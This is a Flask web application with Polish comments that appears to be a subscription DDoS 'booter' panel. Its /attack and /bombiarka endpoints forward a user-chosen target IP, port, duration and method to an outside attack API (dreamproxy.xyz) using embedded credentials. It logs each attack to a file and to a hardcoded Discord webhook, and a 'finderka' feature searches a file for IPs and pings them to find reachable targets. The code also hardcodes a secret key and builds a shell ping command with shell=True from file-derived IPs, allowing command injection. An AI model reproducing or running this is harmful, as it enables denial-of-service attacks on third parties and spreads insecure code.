import re
import subprocess
import requests
from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_bcrypt import Bcrypt
import datetime
import os

app = Flask(__name__)
app.secret_key = '41dd6e3f725710687934560a2f90c1cb5dd1c7e40226198f'
bcrypt = Bcrypt(app)

# Ścieżki do plików
USER_FILE_PATH = r'/home/plzbody/users/users.txt'
LOG_FILE_PATH = r'/home/plzbody/LOGI/attack_logs.txt'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1281914736761507860/2ymKkiNnlI_9UxKYWqv9XZNfIXoo_63gzlXWB11KXQrl9WeeMzrlWJ3hMnLbQQgwl6VC'
FINDERKA_FILE_PATH = r'/home/plzbody/sperma/skleja.txt'

# Funkcja do wysyłania logów do Discorda
def send_discord_log(nick, target_ip, method, time, port, status):
    webhook_data = {
        "content": "",
        "embeds": [
            {
                "title": "Nowy atak!",
                "color": 3066993,
                "fields": [
                    {"name": "NICK", "value": nick, "inline": True},
                    {"name": "TARGET", "value": target_ip, "inline": True},
                    {"name": "METHOD", "value": method, "inline": True},
                    {"name": "TIME", "value": time, "inline": True},
                    {"name": "PORT", "value": port, "inline": True},
                    {"name": "STATUS", "value": status, "inline": True},
                ],
                "timestamp": datetime.datetime.utcnow().isoformat()
            }
        ]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=webhook_data)

# Funkcja do wyszukiwania frazy w pliku
def search_phrase_in_file(file_path, phrase):
    results = []
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as file:
            for line in file:
                match = re.search(rf'\b{phrase}\b', line)
                if match:
                    extracted = re.search(rf'{phrase}[\.,;:]\s*(\S+)', line)
                    if extracted:
                        results.append(extracted.group(1))
    return results

# Funkcja do pingowania IP
def ping_ip(ip):
    try:
        output = subprocess.check_output(f"ping -n 1 -w 500 {ip}", shell=True, universal_newlines=True)
        if "Reply from" in output:
            match = re.search(r'Average = (\d+)ms', output)
            if match:
                latency = int(match.group(1))
                if latency <= 140:
                    return "Osiągalny"
        return "Nieosiągalny"
    except Exception:
        return "Nieosiągalny"

# Funkcja do autoryzacji użytkownika
def authenticate(username, password):
    if os.path.exists(USER_FILE_PATH):
        with open(USER_FILE_PATH, 'r') as file:
            for line in file:
                user, hashed_password, *expiration = line.strip().split(':')
                if user == username and bcrypt.check_password_hash(hashed_password, password):
                    if expiration:
                        exp_date = datetime.datetime.strptime(expiration[0], '%Y-%m-%d %H:%M:%S')
                        if exp_date > datetime.datetime.now():
                            return True
                        else:
                            return False  # Konto wygasło
                    return True  # Brak daty wygaśnięcia, czyli aktywne
    return False

# Endpoint logowania
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if authenticate(username, password):
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid username or password", 403
    return render_template('login.html')

# Endpoint wylogowania
@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

# Panel admina do zarządzania użytkownikami i wygasaniem tokenów
@app.route('/adminpage', methods=['GET', 'POST'])
def adminpage():
    if 'username' not in session or session['username'] != 'plzbody':
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        days = int(request.form.get('days', 0))
        hours = int(request.form.get('hours', 0))
        minutes = int(request.form.get('minutes', 0))
        seconds = int(request.form.get('seconds', 0))

        expiration_time = datetime.datetime.now() + datetime.timedelta(days=days, hours=hours, minutes=minutes, seconds=seconds)
        hashed_password = bcrypt.generate_password_hash(password).decode('utf-8')

        with open(USER_FILE_PATH, 'a') as file:
            file.write(f"{username}:{hashed_password}:{expiration_time.strftime('%Y-%m-%d %H:%M:%S')}\n")

        return f"Użytkownik {username} został dodany z ważnością tokenu do {expiration_time}"

    return render_template('adminpage.html')

# Endpoint do wyszukiwania fraz
@app.route('/finderka', methods=['GET', 'POST'])
def finderka():
    if 'username' not in session:
        return redirect(url_for('login'))
    
    results = []
    error_message = None
    if request.method == 'POST':
        phrase = request.form.get('phrase')
        if phrase:
            try:
                found_ips = search_phrase_in_file(FINDERKA_FILE_PATH, phrase)
                if found_ips:
                    for ip in found_ips:
                        ping_result = ping_ip(ip)
                        results.append(f'{phrase} {ip} - {ping_result}')
                else:
                    results.append(f'Nie znaleziono wyników dla frazy: {phrase}')
            except Exception as e:
                error_message = str(e)
    
    return render_template('finderka.html', results=results, error_message=error_message)

# Endpoint do wysyłania ataku
@app.route('/attack', methods=['POST'])
def attack():
    if 'username' not in session:
        return redirect(url_for('login'))

    data = request.json
    target_ip = data.get('target_ip')
    port = data.get('port')
    time_duration = data.get('time')
    method = data.get('method')

    if target_ip and port and time_duration and method:
        url = f"http://dreamproxy.xyz:2115/api/attack?username=sigmoza&password=sigmoza&target={target_ip}&port={port}&time={time_duration}&method={method}"
        try:
            response = requests.get(url)
            status_code = response.status_code
            
            log_message = f"{datetime.datetime.now()} - {session['username']} - {target_ip} - {method} - {time_duration} - {port} - Status Code: {status_code}\n"
            with open(LOG_FILE_PATH, 'a') as log_file:
                log_file.write(log_message)
            
            status_message = 'Atak został wysłany pomyślnie!' if status_code == 200 else 'Atak został zlecony.'
            send_discord_log(session['username'], target_ip, method, time_duration, port, status_message)
            
            return jsonify({'status': 'success', 'message': status_message})
        except Exception as e:
            return jsonify({'status': 'error', 'message': 'Wystąpił błąd podczas wysyłania ataku.'}), 500
    return jsonify({'status': 'error', 'message': 'Brak wymaganych danych.'}), 400

# Endpoint do bombiarka
@app.route('/bombiarka', methods=['GET', 'POST'])
def bombiarka():
    if 'username' not in session:
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        target_ip = request.form.get('target_ip')
        port = request.form.get('port')
        time_duration = request.form.get('time')
        method = request.form.get('method')

        if target_ip and port and time_duration and method:
            url = f"http://dreamproxy.xyz:2115/api/attack?username=sigmoza&password=sigmoza&target={target_ip}&port={port}&time={time_duration}&method={method}"
            try:
                response = requests.get(url)
                status_code = response.status_code
                
                log_message = f"{datetime.datetime.now()} - {session['username']} - {target_ip} - {method} - {time_duration} - {port} - Status Code: {status_code}\n"
                with open(LOG_FILE_PATH, 'a') as log_file:
                    log_file.write(log_message)
                
                status_message = 'Atak został wysłany pomyślnie!' if status_code == 200 else 'Atak został zlecony.'
                send_discord_log(session['username'], target_ip, method, time_duration, port, status_message)
                
                return jsonify({'status': 'success', 'message': status_message})
            except Exception as e:
                return jsonify({'status': 'error', 'message': 'Wystąpił błąd podczas wysyłania ataku.'}), 500
    return render_template('bombiarka.html')

@app.route('/')
def index():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
